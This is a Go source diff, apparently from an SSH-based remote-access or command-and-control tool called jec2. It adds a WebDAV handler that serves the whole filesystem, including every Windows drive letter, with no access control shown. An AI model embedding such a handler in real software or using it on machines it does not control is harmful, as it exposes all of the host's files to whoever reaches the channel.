@@ -11,13 +11,17 @@ package main
 import (
 	"bufio"
 	"errors"
+	"fmt"
 	"io"
 	"log"
 	"net"
+	"net/http"
+	"runtime"
 	"sync"
 
 	"github.com/magisterquis/jec2/cmd/internal/common"
 	"golang.org/x/crypto/ssh"
+	"golang.org/x/net/webdav"
 )
 
 // FakeListener implements a net.Listener which allows for sending net.Conns
@@ -147,4 +151,29 @@ func NewWebDAVLogger() *log.Logger {
 		}
 	}()
 	return l
+}
+
+// WebDAVHandler returns an http.Handler which serves up WebDAV.  On most
+// platforms, it simply serves from /.  On Windows, it has 26 different roots,
+// one for each posssible drive.
+func WebDAVHandler() http.Handler {
+	/* Most OSs are easy. */
+	if "windows" != runtime.GOOS {
+		return &webdav.Handler{
+			FileSystem: webdav.Dir("/"),
+			LockSystem: webdav.NewMemLS(),
+		}
+	}
+
+	/* Roll a ServeMux whih handles each drive separately. */
+	sm := http.NewServeMux()
+	for drive := 'a'; drive <= 'z'; drive++ {
+		p := fmt.Sprintf("/%c", drive)
+		sm.Handle(p, &webdav.Handler{
+			Prefix:     p,
+			FileSystem: webdav.Dir(fmt.Sprintf("%c:\\", drive)),
+			LockSystem: webdav.NewMemLS(),
+		})
+	}
+	return sm
 }
